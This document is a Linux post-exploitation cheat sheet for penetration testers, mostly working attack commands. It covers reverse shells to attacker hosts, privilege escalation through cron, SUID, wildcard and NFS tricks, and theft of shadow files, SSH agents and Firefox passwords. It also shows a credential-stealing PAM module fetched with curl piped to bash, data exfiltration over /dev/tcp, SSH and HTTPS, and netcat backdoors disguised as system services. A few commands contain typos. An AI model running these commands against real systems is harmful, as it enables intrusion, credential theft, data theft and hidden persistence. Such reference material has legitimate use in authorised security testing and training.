#  Linux Post-Exploitation 

--- 

<br>

### 0) Stabilizing the Shell

Get an interactive bash shell:
    - `bash -i`

Upgrade shell with Python:
1. use `python -c 'import pty;pty.spawn("/bin/sh")'` to make Python spawn a better featured bash shell (may need to use python2 or python3 instead of just python)
2. enter export TERM=xterm to get access to term commands (i.e. clear, etc.)
3. background the shell with `<Ctrl-Z>`, then back in your own terminal use `stty raw -echo; fg` to turn off your own terminal echo (which gives you access to tab autocompletes, the arrow keys, and `<Ctrl> + C` to kill processes) and then foreground the reverse shell
- i.e. `python -c 'import pty;pty.spawn("/bin/bash")'` -> `export TERM=xterm` -> `<Ctrl-Z>` -> `stty raw -echo; fg`
- if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo), type reset and press enter to fix this

Use rwrap:
 - rlwrap is a program that gives you access to history, tab autocompletion and the arrow keys immediately upon receiving a shell, however some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell
 - to install: `sudo apt install rlwrap`
 - to use: `rlwrap nc -lvnp <port>`
 - then to fully stablise on a Linux box: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell

Use Socat:
- use an initial netcat shell as a stepping stone into a more fully-featured socat shell
1. transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) onto the target machine
	- i.e. start a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80)`, then use the netcat shell on the target machine to download the file
	- on Linux you can use curl or wget (i.e. `wget <LOCAL-IP>/socat -O /tmp/socat`)
2. setup a Socat listener on attack machine: `./socat TCP-L:<port> FILE:`tty`,raw,echo=0`
3. connect back to listener from target machine: `./socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

<br>

 With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen:
1. open another terminal and run `stty -a` to get a rows and columns number
2. in your reverse/bind shell, change row size with `stty rows <number>` and column size with `stty cols <number>`, using the numbers you got from running the command in your own terminal
- this will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

<br>

--- 

### 1) Privilege Escalation 

#### a) Enumeration 

**System and network information**:
- to show hostname (revealing system's function): `hostname`
- for kernel version (for kernel exploits): `uname -a`
- for OS version: `cat /etc/issue`
- for IP: `ipconfig`
- for network routes: `rounte -n`
- for network connections: `netstat -auntp`
- for network socket connections: `ss -antlp`


**User information**: 
- for all files belonging to a user: `find / -user <username>`
- to show users last active on the system: `last -a` (you may have credentials for these users)
- to show how many root accounts are on the system: `cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'` (you may have credentials for these users)
- to show users/service accounts on the system: `cat /etc/passwd`
- to list all home directories: `ls -als /home/*` (may contain useful files)

**Privileged access / cleartext credentials**:
- to see if current user can execute anything with elevated privileges: `sudo -l`
- to see if any SUID root binaries on the system: `find / -perm -4000 -type f 2> /dev/null`
- to see if you can read any configuration files with "password" in them: `grep -r "password" /etc/*.conf 2> /dev/null`)
- to see if you can read the contents of the root directory: `ls -ali /root`
- to see if you can read other users' history files: `find /* -name *.*history* -print 2> /dev/null`
- to see if you can write to directories configured to server web pages: `touch /var/www/file`

**Services**:
- if DNS server: `cat /etc/resolv.conf`(can reveal Active Directory accounts, zone transfers, internal hosts, virtual hosts)
- to see what services are configured on the system and if they have network connections: `netstat -auntp`
- to see if an service configuration files are readable or modifiable by the current user: i.e. `find /etc/init.d/ -uid 0 -type f 2> /dev/null | xargs ls -la`
- to see if configuration files contain any sensitive information: i.e. `cat /etc/mysql/my.cnf`
- to see if you can start/stop a service as the current user: `<service> <service_name> <start|stop>`
- list all avaliable services: `systemctl list-unit-files`

**Jobs/tasks**:
- check if any cron jobs run as root and if you can edit these script or inject code into them: `cat /etc/crontab` or `ls -als /etc/cron.*`
- to see if there are any custom jobs or tasks configured as root that are world writeable: `find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`
- to list running processes: `ps -aux`

**Installed software version information**:
- to list installed software packages and their versions: `dpkg -l`
	- can then search to see if these version are vulnerable: `searchsploit <version>`

<br>

Automated enumeration process:
- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
	- to search for cleartext credentials ("password") within configuration files: `linenum.sh -k password`
- [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
- [Unix-Privesc-Check](https://github.com/pentestmonkey/unix-privesc-check)
- [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
- in Meterpreter: `run post/multi/recon/local_exploit_suggester`

Uploading privilege escalation scripts:
- with netcat: on the target machine: `nc -l -p 1234 > /tmp/LinEnum.sh` and on the attacker machine: `nc -w 3 <target_ip> 1234 < LinEnum.sh`
- with wget: `cd /tmp && wget <url>`

<br> 

Other resources for privilege escalation include:
	- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
	- https://www.rebootuser.com/?p=1623
	
<br>

#### b) Exploitation 

**Cleartext credentials in configuration files**:
-  to find any configuration files with "password" in them: `grep -r "password" /etc/*.conf 2> /dev/null`)
- to find dot files with "history" in their names which may contain previously used credentials (i.e. .bash_history): `find /* -name *.*history* -print 2> /dev/null`
- to grep the apache `access.log` file for "user" and "pass" strings: `cat /var/log/apache/access.log | grep -E "^user|^pass"`
- to dump cleartext pre-shared wireless keys frm Network Manager: `cat /etc/NetworkManager/system-connections/* | grep -E "^id|^psk"`
- look for SSH keys: `ls -l /.ssh`
	- if you find a private SSH key, then you can copy it over to your attack box (i.e. just copy/paste the key over) and give it the correct permissions to execute: `chmod 600 root_key`
   - then you can use the SSH key to login to the target machine: `ssh -i root_key root@10.10.10.10`
   - if the key is encrypted you can crack it with John:
	   - i) convert to a format John can crack with `ssh2john.py`
	   - ii) use John to crack 
- search through files in user's home directory: `ls -als /home/<user>`
 
<br>

**SUID/SGID binaries**:
- a) find SUID/SGID binaries: 
	- `find / -perm -4000 -type f 2> /dev/null`
	- or `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- b) find if these binaries can be abused and how via [GTFOBins](https://gtfobins.github.io/))
- a program does not specify an absolute path to the SUID/SGID binaries it calls then it can be exploited:
	- i) check if it uses absolute paths: `strings <program>`
	- ii) if not then replace the library/program it calls with your own:
		- i.e. a shell: `/bin/bash -p`
	- iii) then execute the program

**Sudo privileged access**:
- a) find if the current user has any SUDO privileges: `sudo -l`
- b) find if this privileged execution can be abused and how via [GTFOBins](https://gtfobins.github.io/))
- check if you can run a program as root if it uses absolute paths (if not then this can be exploited, like above0)

<br> 

**Restricted shells**:
- a) find if you are in a restricted shell (i.e. "rbash")
	- see if you can; change directories (`cd`), or specify absolute file paths (`/`, `-`), or set/unset PATH environment variables, or use bash redirection operators, or disable restricted mode using the `set +r` or `set +o restricted` commands
	- if "restricted" errors occur then you are probably in a restricted shell
	- look at your `$PATH` and `$SHELL` environment variables for `/var/chroot/bin` and `/bin/rbash` to confirm you're in a restricted shell
- b) escape the restricted shell:
	- restricted shell escape with Vi/Vim: in Vi/Vim run `!sh`
	- restricted shell escape with find:
		-  `find /home/bob -name test -exec /bin/sh \;` -- this command looks for a file named "test" in `/home/bob` and, if found, will execute whatever follows the `-exec` switch (i.e. `/bin/sh`)
		- this trick will only work if the file you are searching for exists in the specified path so search for known files or create a new one 
	- restricted shell escape with Python and Perl:
		- `python -c 'import pty; pty.spawn("/bin/sh")'`
		- `perl -e 'exec "/bin/sh";'`
	- restricted shell escape from another system:
		- `ssh <restricted_user>@<target_server> -t "/bin/sh"`

<br>

**Cron Jobs**:
- a) find out what cron jobs there are: `cat /etc/crontab`
- *file permissions* -- if a cron job is a file that is world-writable (or the user your logged in as can write to it), then you can overwrite the script file to give yourself a root shell (because cron tabs run with root privileges)
	- i) check if writeable: `ls -al /path/to/cronjob.sh`
	- ii) replace contents with a reverse shell: `bash -i >& dev/tcp/<attack_box_IP>/<port> 0>&1`
	- iii) setup a netcat listener (`nc -nvlp 4444`) on your attack box and wait for the cron job to run, and a root shell should connect back to your netcat listener
- *PATH environment variable* -- if when viewing the contents of the system-wide crontab you see that the PATH variable is set to a directory you have write permissions to (i.e. "/home/user"), then you can create a file that matches a cronjob script name in that directory and it will be executed (found) before the actual cronjob script if it's higher in the PATH, as example:
	- i) create a file called "cron-job.sh" in "/home/user" with:
		```bash
		#!/bin/bash
		cp /bin/bash /tmp/rootbash
		chmod +xs /tmp/rootbash
		```
    - ii) make it executable (`chmod +x /home/user/cron-job.sh`), wait for the cronjob to run, and then run `/tmp/rootbash -p` to gain a shell running with root privileges
- *wildcards* -- if a cronjob uses wildcards (\*) in a directory you can control (i.e. `cat /path/to/cronjob.sh`), then you can use GTFOBins to see if their are command line options that let you take over the commands that cronjob runs (i.e. the [tar](https://gtfobins.github.io/gtfobins/tar/) command): 
    - i) use msfvenom on to generate a reverse shell ELF binary on your attack box: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.63.96 LPORT=4444 -f elf -o shell.elf`
    - ii) transfer it to the target machine (i.e. with scp or wget from a local webserver on your attack box) and make the file executable: `chmod +x /home/user/shell.elf`
    - iii) create two additional files in "/home/user": `touch /home/user/--checkpoint=1`<br>`touch /home/user/--checkpoint-action=exec=shell.elf`
    - iv) when the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames
    - v) setup a netcat listener on your attack box on port 444 (`nc -nvlp 4444`) and wait for the cronjob to run 

<br>

**Weak File Permissions**
- *readable /etc/shadow* -- if the /etc/shadow file is readable by a user (or anyone other than root) then it can be used to escalate privileges by cracking it's hashes
	- a) check the file permission the file has: `ls -l /etc/shadow`
	- b) get a local copy of the "/etc/shadow" and "/etc/passwd" files
	- c) use the `unshadow` tool to combine the two files into a format compatible for cracking with John: `unshadow passwd shadow > shadow.john`
	- d) take the `shadow.john` and run it through John in conjunction with a wordlist: `john shadow.john --wordlist=/usr/share/wordlists/rockyou.txt`
	- e) switch to the root user using the password you cracked: `su root`
- *writeable /etc/shadow* -- if the /etc/shadow file is writable by a user (or anyone other than root) then it can be used to escalate privileges by replacing the root user's hashed password
	- a) check the file permission the file has: `ls -l /etc/shadow`
	- b) generate a new password hash with a password of your choice: `mkpasswd -m sha-512 mypassword`
	- c) edit the "/etc/shadow" file and replace the original root user's password hash with the one you just generated
	- d) switch to the root user using the password you just created: `su root`
- *writeable /etc/passwd* -- if the /etc/passwd file is writable by a user (or anyone other than root) then it can be used to escalate privileges by adding a new root user
	- a) check the file permission the file has: `ls -l /etc/passwd`
	- b) generate a new password hash with a password of your choice: `openssl passwd mypassword`
	- c) edit the "/etc/passwd" file and place the generated password hash between the first and second colon (:) of the root user's row (replacing "x")
	- d) switch to the root user using the password you just created: `su root`
	- alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x"), and then switch to the newroot user

<br>

**MimiPenguin**
- if cracking the root or other users' password is out of the realm of possibility due to hash strength or password complexity, you can try and obtain the root password directly from the machines' memory using the tool known as [MimiPenguin](https://github.com/huntergregal/mimipenguin)
- MimiPenguin works similarly to the well-known "mimikatz" for Windows, but is designed for Linux and attempts to dump cleartext credentials from memory for the following applications: 
	- GDM password (Kali Desktop, Debian Desktop)
	- Gnome Keyring (Ubuntu Desktop, Arch Linux Destkop)
	- VSFTPd (active FTP connections)
	- Apache2 (active HTTP Basic Auth sessions)
	- OpenSSH (active SSH sessions - Sudo usage)
- there are two different MimiPenguin scripts avaliable, a shell script and a Python script, which both have their pros and cons with some features support by on and not the other (try both or the one with the features for the system you are exploiting)
- once you've uploaded and execute the MimiPenguin scripts on your target system, you can see whether they were successful or not in obtaining credentials 
- you can use this tool regardless of password complexity to still obtain users' credentials 


<br>

**Pilfering credentials from swap memory**:
- you can dump sensitive information from the swap file on a compromised machines 
- everything is a "file" in Linux, including the swap spaces, so you can use built-in tools to gather information from this 
- a caveat of this technique is that it has to be done as the root account and may also be prone to false-positives as it's difficult to ascertain exactly where in the swap memory sensitive information will be temporarily stored 
- the partition or "file" defined as the swap file can be found with the command: `swapon -s` or with the `cat /proc/swaps` command
- next, you can use the `strings` command against the file/partition found and grep for strings you're looking for 
	- i.e. `strings /dev/sda5 | grep "password="`
	- i.e. `strings /dev/sda5 | grep "&password="`
- a shell script called `swap_digger.sh` has also been written which can automate the searching for common sensitive strings within the swap file, and can be downloaded from [here](https://github.com/sevagas/swap_digger)

<br> 

**Code execution via shared object library loading**:
- hijacking dynamically linked Shared Object libraries (`.so` files) is another method you can use to obtain elevated privileges to a Linux system under certain conditions
- there are two primary types of shared object libraries:
	- **Static Libraries** (`.a`) -- code that is compiled into an application
	- **Dynamic Linked Shared Object Libaries** (`.so`) -- these can either be *linked* to the application at runtime or loaded/unloaded and linked during an applications' execution 
	- more information on these types can be found [here](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html)
- a) find "interesting" executables on the system that link to shared libraries (using `ldd`)
	- usually a program executing with SUID/SGID or Sudo permissions (i.e. `ldd <program>`)
- b) determine if that executable is compiled with the `RPATH` or `RUNPATH` options (using `objdump`), and if they are, then find out if that Shared Object directory these option point to is writeable 
	- i.e. `objdump -x /usr/local/bin/program | grep RPATH` and `objdump -x /usr/local/bin/program | grep RUNPATH`
- c) create a malicious `.so` file (with the same name as the linked library `.so` file) to put into the Shared Object directory:
	- use msfvenom to create a reverse shell: `msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_lport> -f elf-so -o program.so`
- d) setup a Metasploit listener on the attack machine and transfer the payload to the target machine 
	- i.e. on the attack machine: `python3 -m http.server 8080`
	- i.e. on the target machine: `cd <library_directory> && wget http://<attacker_ip>:8080/program.so`
- note, in order to escalate privileges with this vulnerability, it is required that the shared object via executing the program, be executed by a user with higher privileges or scheduled as part of a cron job that runs as root or with the SUID/SGID bit set
- if a cron job then setup the revese shell and wait till it executes, or get a privileged user to execute it via social engineering
- alternatively, if you are already root on the system, you can use this method as a stealthy persistence mechanism 


<br>

**Kernel exploits**:
- a) find the kernel version and search for an exploit or use a tool to identify potential kernel exploits:
	- i) `uname -a` -> `searchsploit kernel <version>`
	- ii) `perl linux-exploit-suggers-2.pl`
- b) check if target has `gcc` compiler installed: `gcc -v`
- c1) if compiler installed then download the exploit onto target, compile, and run 
- c2) if no compiler, the compile on your own system (making sure to use matching architecture to target), download onto the target and run 

**Service/Software Exploits**
- a) find the service/software version and search for an exploit or use a tool to identify potential service/software exploits:
	- i) `dpkg -l` -> `searchsploit <version>`
	- ii) `perl linux-exploit-suggers-2.pl`
- b) check if target has `gcc` compiler installed: `gcc -v`
- c1) if compiler installed then download the exploit onto target, compile, and run 
- c2) if no compiler, the compile on your own system (making sure to use matching architecture to target), download onto the target and run 

<br>

**Unix socket exploitation**:
- a *Unix socket* is another component of \*nix systems that can be leveraged to escalate you privileges 
- to safely use a Unix socket, the appropriate security measures/permissions must be implemented beforehand, and this is not always the case 
- for example, an insufficiently secured Unix socket that can be leveraged is Docker
	- by design, the *docker* daemon binds to a Unix socket instead of a TCP port and, by default, this socket is owned by the user *root* and the *docker* daemon always runs as *root*
	- if an unprivilege user has access to the `docker` command (is part of the *docker* group), and the [docker Unix socket](https://medium.com/lucjuggery/about-var-run-docker-sock-3bfd276e12fd) is not protected by implementing appropriate permissions, then that user could escalate their privileges on that machine 
	- i.e. to access the `/etc/shadow` file as a non-root user:
		- get container ID with: `docker -v /etc/shadow:/docker/hashedpasswords -d postgres`
		- connect to the docker socket (running as root) as a non-root user to get a root shell in docker: `docker exec -ti <CONTAINER_ID> bash` 
		- copy passwords to a new file: `cat /docker/hashedpasswords > /docker/test.txt`
		- make that file executable: `chmod 777 /docker/test.txt`
		- view passwords: `cat /docker/test.txt`
- other examples include:
	- https://www.exploit-db.com/exploits/40962/
	- https://github.com/rapid7/metasploit-framework/pull/9408/files 

<br> 

**NFS**:
- files created via NFS (Network File System) inherit the *remote* user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user
- a) check the NFS share configuration with: `cat /etc/exports`
  - note any directory shares that have root squashing disabled (i.e. /tmp) with the "no_root_squash" option
- b)  on attack box switch to your root user (`su root`), create a mount point on your attack box, and mount the target's shared directory (i.e. /tmp)
  - `mkdir /tmp/nfs`
  - `mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs`
- c) on attack box (still as root), generate a payload using *msfvenom* and save it to the mounted share
	  - this payload simply calls /bin/bash: `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
- d) make the file executable as the root user on your attack box and set the SUID permission: `chmod +xs /tmp/nfs/shell.elf`
- e) finally, back on the target machine, execute the file as the low privileged user account to gain a root shell: `/tmp/shell.elf`

<br>

**Exploiting Linux wildcards** ([article](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)):
- Linux wildcards can be exploited when used with options in chown, tar, rsync, etc., by specially crafting filenames you can inject arbitrary arguments to shell commands run by others (including root)
- for example, the tar command can be poisoned:
	- this can be done by exploiting the `--checkpoing[=NUMBER]` and`--checkpoint-action=ACTION` options when tar is run with the wildcard `*` (against all files in a directory)
	- inserting `--checkpoint=1` and `--checkpoint-action=exex=sh shell.sh` (where "shell.sh" is a reverse shell included in the directory the tar command is being run against), these options will result in tar executing the "shell.sh" file with whatever privileges the command is being run under (i.e. root)
- i.e. the "/var/www/html" directory is being backed up via a script which users the tar command with the `*` wildcard:
	- a) you can create a reverse shell in this directory:
		- `echo "rm /tmp/f;mkfifo /tmp/f|/bin/sh -i 2>&1|nc 10.11.31.198 4444 > /tmp/f" > shell.sh`
	- b) then add the two tar options to make this reverse shell run
		- `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" && touch "/var/www/html--checkpoint=1"`
	- c) then execute the backup script, which runs the tar command, and this will then execute the reverse shell: `~/backup.sh`
	
<br>
	
**Writeable Docker Socket**:

- if `/var/run/docker.sock` is writeable, you can use it to escalate your privileges to get a root shell
- see [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-dprocessocker-socket)


<br>

--- 

### 2) Lateral Movement 

**SSH hijacking**:
- SSH Session Hijacking is one of the methods you can use explore for lateral movement (it is on the Mitre ATT&CK Framework as technique [T1184]()https://attack.mitre.org/wiki/Technique/T1184)
- for this method to be successful, the compromised machine should have an active SSH session established with another machine via Public Key Authentication 
- if you are root on the compromised system, it is then possible to either compromise the SSH agent or access the SSH agent's unix domain socket and hijack the connection 
- this is possible because the `ssh-agent` creates a unix domain socket, and then listens for connections from the `sshd` daemon to this socket 
- the protection of the socket replies on simple unix permissions, which ultimately means that any authentication keys that are use with that socket can be retrieved by any user who can connect to the socket itself -- [reference](https://www.symantec.com/connect/articles/ssh-and-ssh-agent)
- a) first determine the SSH process ID of the user on the compromised host with: `ps aux | grep sshd`
- b) next, determine the `SSH_AUTH_SOCK` environment variables for the sshd PID with: `grep SSH_AUTH_SOCK /proc/<pid>/environ`
- c) then hijack the target's `ssh-agent` socket with: `SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add -l`
- d) finally, log into the remote system the victim is logged into as the target with: `ssh <remote_system> -l <victim>`
- more detailed steps: https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/

<br>

**Stealing SSH credentials**:
- if you have successfully compromised a machine, are currently operating as *root*, and want to collect additional credentials to move laterally leveraging the credential reuse case, then you can steal SSH credentials through a [malicious PAM module](https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==)
- through this malicious PAM module, every SSH connection attempt will be forwarded to a server under you control, along with the credentials used for that connection attempt 
- a) on the attacker machine: `git clone https://github.com/mthbendardes/sshLooter.git && cd sshLooter`
- b) then, host and edit the `install.sh` and `looter.py` scripts, pointing the *url* variable to a server under your control and that can log POST requests
- c) on the compromised machine: `curl http://<attack_server_ip>:8000/install.sh | bash`
- d) now when a SSH connection is made, a POST request should be made with the SSH credentials used for said connection to the server under your control

<br>

**Samba secrets**:
- dump machine account passwords stored on a Samba server that you discover and use relationship with an Active Directory infrastructure for lateral movement 
- new Samba user information is usually stored in a `secrets.tdb` file, which in Samba version 4.7.4 on Debian is stored in the `/var/lib/samba/private` directory 
- assuming you are root on a machine, you can use the `tdbdump` command to dump the information in the `secrets.tdb` file with the command: `tdbdump /var/lib/samba/private/secrets.tdb`
- this will then output several interesting fields, such as; membership to domains, encoded NTLM hashes, etc.
- now assuming the Samba server has a valid trust relationship with an Active Directory domain, you can decode the results of the `tdbdump` UTF8 endcoded `data` fields to obtain the NTLM hash for the Samba computer account and ultimately pass-the-hash to Active Directory using the `pth-smbclient` from the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
- this method is described in great details at: https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

<br>

**VPNPivot**

- another tool you can use for lateral movement is VPNPivot, which creates a VPN tunnel between the attacker and the compromised Linux host and allows pivoting to other hosts internally within an organisation that may be behind firewalls, NAT configurations, etc. 
- once downloaded, you can compile and install it with: `./autogen.sh && ./configure && make && make install`
- you can download the tool and it's usage instructions from https://github.com/0x36/VPNPivot 

<br>

**Dumping stored Firefox credentials**:
-  dumping the stored bookmarks from a users' browser can be used to determine what sites a user routinely visits and has access to, which can then be used to move laterally 
- in addition to this, you can dump the credentials that a Linux user has stored in their Firefox browser for sites they frequent (done by browsers for a user's convenience) and these stored credentials can be decrypted and used by a pentester
- when Firefox is launched for the first time, it creates a default profile for the user
- this profile can be found in the `/home/user/.mozilla/firefox` and is a folder which is created with a random alphanumeric value and a `.default` string appended (i.e. `8msaug56.default`)
- the saved browser passwords are stored in the randomly named private folder, in a file called `logins.json`, and can be dumped using a tool known as `firefox_decrypt.py` -- a python script which can be downloaded from https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py 
- this python script can be transferred/copied on to the target system and then run with: `python firefox_decrypt.py`
- once run, it will list any profiles currently configured in Firefox for the currently logged on user, and also ask which one you'd like to use in addition to asking for the Master Password, just press enter to continue without one
	- note, this tools will only works if the Master Password has not been set 
- this is a great and quick technique together credentials to other areas of the network 

<br>

##### See [[pivoting]]

--- 

### 3) Data Exfiltration

**Upload/download files to a writeable location (i.e. "/tmp")**:
- use scp if you have ssh credentials: `scp -P <port> <user>@<host>:<file>`
- use wget if available:`wget http://<host>:<port>/<file>`  
- use netcat if available: `nc -l -p 1234 > /tmp/LinEnum.sh` and on the attacker machine: `nc -w 3 <target_ip> 1234 < LinEnum.sh`
- us curl if available 

<br>

**Exfil over TCP socket with EBCDIC and Base64**:
- a) on the attacker system, first configure a netcat listener on TCP port 80 to receive incoming data while redirecting the output to a file
	- i.e. `nc -lnvp 80 > datafolder.tmp`	
- b) on the target system, tar the data folder to standard output (stdout, `-`), encode with both Base64 and EBCDIC, and redirect the data over a local TCP socket to the attack machine 
	- i.e. `tar -zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<attacker_ip>/80` -- "datafolder" is the folder containing the data
- c) on the attacker machine, decode the received "datafolder.tmp" file from EBCDIC back to ASCII, decode the Base64, and redirect the output to a file (i.e. "datafolder.tar")
	- i.e. `dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar`
- d) extract the tar archive
	- i.e. `tar -xf datafolder.tar`

<br>

**Exfil over SSH**:
- a) on the target system, tar the contents of the "/tmp/datafolder" while sending the output to stdout (`-`) and then SSH it over to the attacker system while untar'ing the contents into the "/tmp/datafolder" directory on the attacker side simultaneously
	-  i.e. `tar -zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar -zxpf -"`
-  b) on the attacker system, the data is already untar'd and in the "/tmp/datafolder", so you can simply browse to this directory and view the data 
-  for extra "stealthiness", you should configure SSH on port 80, just in case the customer is monitoring for SSH traffic over the standard port 22 

<br> 

**Exfil via POST request over HTTPS**:
- a) on the attacker system, create a PHP file (i.e. `contents.php`) that will write data being recieved as a POST request, to a file called "/tmp/datafolder.base64" on the system
	-  i.e. `<?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>`
-  b) from the victim machine, issue a curl command that will send a POST request consisting of a tar'd and base64-encoded data from the victims' "/tmp/datafolder" directory to the attacker-controlled PHP webservers `contents.php` file over SSL
	-  i.e. `curl --data "$(tar -zcf - /tmp/datafolder) | base64)" https://<attacker_server>/contact.php`
-  c) once the attacker machine has received the POST'd data and written it to the "/tmp/datafolder.base64" file, you can decode it while redirectring the output to a "datafolder.tar" archive and extract
	-  i.e. `cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar -xf datafolder.tar` 

<br>

--- 

### 4) Maintaining Access & Persistence

#### Reverse shells:
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://highon.coffee/blog/reverse-shell-cheat-sheet/

<br> 

#### Custom services:

**Xinetd UDP Portknock Backdoor**
- utilities the built-in "xinetd" daemon, which is used to manage network-based services on Linux system, it listens for incoming requests to ports you can define, and when a specific request is received, you can have it execute a command of your choosing 
- for instance, you can create a custom xinetd service which listens on a UDP port which you can send a single UDP packet to and, once that packet is received to the port you define, it can then initiate a netcat reverse shell back to your attacker system 
- this is called a "UDP port-knock backdoor" because once you "knock" on the UDP port, it gives you an immediate reverse shell 
- [port knocking](https://en.wikipedia.org/wiki/Port_knocking) is a well-known concept, but it is being implemented differently here, not requiring and third-party software, and giving you persistence across reboots
- a) on the target machine, create a custom xinetd service (i.e. `xinetd_server.sh`) that you can run on the host 
	- script can downloaded from [here](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56), making sure to modify the <attacker_ip> and <attacker_port> strings
	- when this script is executed it will create a new xinetd service called "services-upd" which is a custom service configured to listen on UDP port 65534 on a target machine
	- it also requires that netcat (`nc`) is on the target machine in the usual `/bin/` directory and it will copy this executable to a file called `/bin/services-udp` to obfuscate that netcat is being used 
- b) on the attacker machine, start up a netcat listener with the same <attacker_port> defined in the `xinetd_server.sh` script before running it
	- i.e. `nc -nlvp 4444`
- c) use a tool called `hping3` to send a single UDP packet to port 65534 on the target machine, at which point, the custom "services-udp" netcat binary will be triggered and send you a reverse shell 
	- i.e. `hping3 -2 -c 1 <target_ip> -p 65534`

<br>

**Systemd Netcat Bind Shell**
- another method for persistence, which also involves creating a custom service that will persist across reboots, uses "Systemd" (a replacement for the "Unix System V init" system) which is used to launch services and processes on system startup 
- the process is somewhat similar to the previous xinetd backdoor, but this one creates as "bind shell" rather than initiating a reverse shell 
- with a bind shell, the attacker directly connects to the bind port and is greeted with a shell, thus an attacker is initiated a connection to the target for a shell rather than the target connecting back to the attacker system
- a) on the target system, copy the `/bin/nc` executable to the `/lib/systemd` directory and call it "systemd-service"
	- i.e. `cp /bin/nc /lib/systemd/systemd-service`
- b) still, on the target, create a file called `/lib/systemd/system/system.service` which creates a bind shell on TCP port 56825, with the following contents:
	```
	[Unit]
	Description = Systemd Service
	After = network.target
	[Service]
	ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
	[Install]
	WantedBy = multi-user.target
	```
- c) enable and start the new Systemd Netcat Binary Shell service on the target
	- i.e. `systemctl enable systemd.service && systemctl start systemd.service`
- d) confirm that the port for your custom service is listening on the target
	- i.e. `netstat -auntp | grep 56825`
- e) from the attacker machine, connect to port 56825 on the target using netcat to get a shell
	- i.e. `nc <target_ip> 56825`
- this service will persist on reboots and will be listed as "systemd-service" when listing processes 

<br>

**Creating an account**
- some exploits also allow you to add your own account, i.e. Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open

<br>

**Steal SSH keys**
- SSH keys are stored in the `/home/<user>/.ssh` directory and are often an ideal way to do this

<br>

**MySQL root access**
> If root access on MySQL then create a user defined function to escalate to root shell
> 
> exploit:
> - https://www.exploit-db.com/exploits/1518/
> - https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
>
> walkthrough:
> - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
> - http://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html

Steps:
- a) copy 1518.so over or lib_mysqludf_sys.so over to target (located on kali under sqlmap directory)
	- /usr/share/sqlmap/udf/mysql/data/udf/linux/32/lib_mysqludf_sys.so_
	- /usr/share/sqlmap/udf/mysql/data/udf/linux/64/lib_mysqludf_sys.so_
- b) :
`mysql -u root`
`use mysql;`
`create table hack(line blob);`
`insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));`
`select * from hack into dumpfile '/usr/lib/lib_mysqludf_sys.so';`
`create function sys_exec returns integer soname 'lib_mysqludf_sys.so';`
- c) Test function:
`select sys_exec('id >/tmp/out; chown user:user /tmp/out');`
`quit`
`cat /tmp/out`
- d) Use function to run a setuid program:
`select sys_exec('chmod + s /tmp/setuid');`
`/tmp/setuid`